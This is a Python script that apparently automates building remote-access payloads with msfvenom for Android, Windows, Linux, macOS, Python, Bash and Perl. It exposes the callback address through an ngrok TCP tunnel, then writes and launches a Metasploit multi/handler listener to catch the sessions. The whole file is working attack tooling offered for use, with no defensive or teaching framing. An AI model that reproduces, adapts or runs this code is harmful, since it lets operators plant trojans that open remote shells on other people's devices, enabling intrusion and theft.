import os, re
import time
import Payload_master as back
from sys import platform
type = ["reverse_tcp", "reverse_http", "reverse_https"]
cyan = "\033[1;36m"
blue = "\033[1;34m"
norml= "\033[0m"
url = ''
lhost = ''
lport = ''

payload = ''
if platform == "linux" or platform == "linux2":
    payload = 'navin_playload/'
else:
    payload = '/sdcard/navin_playload/'    


def ngrok(port):
    from pyngrok import ngrok
    global url,lhost,lport
    url = ngrok.connect(port,'tcp')
    if 'tcp://' in url:
        url = url.replace('tcp://','')
        url = url.replace(':',' ')
        lhost = url.split(" ")[0]
        lport =  url.split(" ")[1]
    
def Android ():
	global payload
	back.banner ()
	payloads = "android/meterpreter/reverse_tcp"
	global url,lhost,lport
	port = '25561'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".apk").replace (" ","")
	ngrok(port)
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o "+payload+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")

def Windows ():
	global payload
	back.banner ()
	payloads = "windows/meterpreter/reverse_tcp"
	global url,lhost,lport
	port = '25562'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".exe").replace (" ","")
	ngrok(port)
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f exe -o "+payload+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")

def Linux ():
	global payload
	back.banner ()
	payloads = "linux/x86/shell/reverse_tcp"
	global url,lhost,lport
	port = '25563'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".elf").replace (" ","")		
	ngrok(port)
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f elf -o "+payload+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")


def Python ():
	global payload
	back.banner ()
	payloads = "python/meterpreter/reverse_tcp"
	global url,lhost,lport
	port = '25564'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".py").replace (" ","")
	ngrok(port)
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o "+payload+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")


def Mac ():
	global payload
	back.banner ()
	global url,lhost,lport
	port = '25565'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".macho").replace (" ","")
	ngrok(port)
	payloads ="osx/x86/shell_reverse_tcp"
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f macho -o "+payload+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")




def Bash ():
	global payload
	back.banner ()
	global url,lhost,lport
	port = '25566'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".sh").replace (" ","")
	ngrok(port)
	payloads = "cmd/unix/reverse_bash_telnet_ssl"
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o "+payload+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")


def Perl ():
	global payload
	back.banner ()
	global url,lhost,lport
	port = '25567'
	output = (input ("\033[1;34mEnter your payload name:--> \033[1;36m")+".pl").replace (" ","")
	ngrok(port)
	payloads = "cmd/windows/bind_perl"
	pld = "msfvenom -p "+payloads+" LHOST="+lhost+" LPORT="+lport+" -f raw -o "+payload+output
	print (cyan+"Creating Payload...\n")
	os.system (pld)
	os.system("touch meterpreter_droid.rc;echo use exploit/multi/handler > meterpreter_droid.rc;echo set PAYLOAD "+payloads+" >> meterpreter_droid.rc;echo set LHOST '0.0.0.0' >> meterpreter_droid.rc;echo set LPORT '"+port+"' >> meterpreter_droid.rc;echo set ExitOnSession false >> meterpreter_droid.rc;echo exploit >> meterpreter_droid.rc;cat meterpreter_droid.rc;clear;msfconsole -r meterpreter_droid.rc;")
